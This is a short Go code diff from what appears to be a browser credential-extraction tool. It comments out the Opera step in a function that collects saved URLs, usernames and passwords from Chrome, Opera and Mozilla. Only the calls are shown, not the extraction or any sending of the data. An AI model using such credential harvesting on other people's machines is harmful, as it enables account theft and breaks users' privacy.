@@ -22,9 +22,11 @@ func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
 	if resultChrome := browsers.ChromeExtractDataRun(); resultChrome.Success {
 		AllBrowsersData = append(AllBrowsersData, resultChrome.Data...)
 	}
+	/*
 	if resultOpera := browsers.OperaExtractDataRun(); resultOpera.Success {
 		AllBrowsersData = append(AllBrowsersData, resultOpera.Data...)
 	}
+	*/
 	if resultMozilla := browsers.MozillaExtractDataRun(); resultMozilla.Success {
 		AllBrowsersData = append(AllBrowsersData, resultMozilla.Data...)
 	}
